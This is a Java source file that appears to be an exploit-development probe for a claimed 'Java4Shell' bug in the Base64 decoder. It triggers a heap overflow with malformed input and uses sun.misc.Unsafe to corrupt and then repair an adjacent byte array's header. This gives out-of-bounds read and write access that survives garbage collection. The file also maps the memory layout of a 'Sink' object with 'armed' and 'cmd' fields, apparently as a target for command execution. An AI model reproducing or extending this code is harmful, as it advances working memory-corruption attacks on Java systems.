import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Diagnostics for the Java4Shell spill. Establishes ground truth for:
 *   1. the exact 64-byte window contents and where it lands
 *   2. byte[] object geometry (base offset, index scale, header layout)
 *   3. how often dst[65]|vic[64] pairs are actually adjacent
 *   4. whether plain Java array stores work on a corrupted klass
 *   5. whether the header can be repaired from an intact sibling
 */
public final class Probe {
    private static volatile int sink;

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        sun.misc.Unsafe u = (sun.misc.Unsafe) uf.get(null);
        long abase = u.arrayBaseOffset(byte[].class);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);

        Arrays.fill(warm, (byte) 0x5a);
        try { d.decode(bad, warm); } catch (IllegalArgumentException e) { }
        StringBuilder sb = new StringBuilder();
        for (int i = 44; i < 116; i++) sb.append(String.format("%02x ", warm[i] & 0xff));
        System.out.println("[1] window warm[44..115]:");
        System.out.println("    " + sb);

        System.out.println("[2] arrayBaseOffset=" + abase
                + " indexScale=" + u.arrayIndexScale(byte[].class)
                + " oopSize=" + u.addressSize());

        final int N = 2048;
        byte[][] dst = new byte[N][], vic = new byte[N][];
        for (int i = 0; i < N; i++) {
            dst[i] = new byte[65];
            vic[i] = new byte[64];
        }
        int corrupted = 0, firstHit = -1;
        for (int i = 0; i < N; i++) {
            try { d.decode(bad, dst[i]); } catch (IllegalArgumentException e) { }
            if (vic[i].length > 1024) { corrupted++; if (firstHit < 0) firstHit = i; }
        }
        System.out.println("[3] adjacency: " + corrupted + "/" + N + " firstHit=" + firstHit);
        if (firstHit < 0) { System.out.println("no corrupted victim"); return; }

        byte[] v = vic[firstHit];
        byte[] ok = vic[(firstHit + 1) % N];

        System.out.println("[4] victim header (raw):");
        System.out.printf("    mark =0x%016x  klass=0x%08x  len=0x%08x (%d)%n",
                u.getLong(v, 0), u.getInt(v, 8), u.getInt(v, 12), u.getInt(v, 12));
        System.out.printf("    sibling mark=0x%016x klass=0x%08x len=%d%n",
                u.getLong(ok, 0), u.getInt(ok, 8), u.getInt(ok, 12));
        System.out.println("    java v.length=" + v.length + " sibling.length=" + ok.length);

        // Do plain array stores survive the corrupted klass?
        boolean storeOk = false, loadOk = false;
        String storeErr = "none";
        try {
            v[0] = (byte) 0x11;
            v[70] = (byte) 0x22;
            v[1000] = (byte) 0x33;
            storeOk = (v[0] == (byte) 0x11 && v[70] == (byte) 0x22 && v[1000] == (byte) 0x33);
            loadOk = true;
        } catch (Throwable t) {
            storeErr = t.getClass().getName() + ": " + t.getMessage();
        }
        System.out.println("[5] plain stores on corrupted klass: storeOk=" + storeOk
                + " loadOk=" + loadOk + " err=" + storeErr);

        // Repair the header from the intact sibling.
        u.putLong(v, 0, u.getLong(ok, 0));
        u.putInt(v, 8, u.getInt(ok, 8));
        System.out.printf("[6] after repair: mark=0x%016x klass=0x%08x len=%d%n",
                u.getLong(v, 0), u.getInt(v, 8), v.length);

        boolean post = false;
        try {
            v[2000] = (byte) 0x44;
            post = (v[2000] == (byte) 0x44);
        } catch (Throwable t) {
            System.out.println("    post-repair store failed: " + t);
        }
        System.out.println("[7] post-repair plain store/load ok=" + post + " v.length=" + v.length);

        java.lang.reflect.Field mf = Sink.class.getDeclaredField("marker");
        java.lang.reflect.Field af = Sink.class.getDeclaredField("armed");
        java.lang.reflect.Field cf = Sink.class.getDeclaredField("cmd");
        System.out.println("[8] Sink layout: marker=" + u.objectFieldOffset(mf)
                + " armed=" + u.objectFieldOffset(af) + " cmd=" + u.objectFieldOffset(cf));

        Sink s = new Sink();
        long so = u.getLong(s, u.objectFieldOffset(mf));
        System.out.printf("[9] Sink marker roundtrip=0x%016x armed=%b%n", so, s.armed);

        System.gc();
        System.out.println("[10] survived System.gc(), v.length=" + v.length);
    }

    static final class Sink {
        long marker = 0x4A345348454C4C21L;
        volatile boolean armed = false;
        String cmd;
    }
}
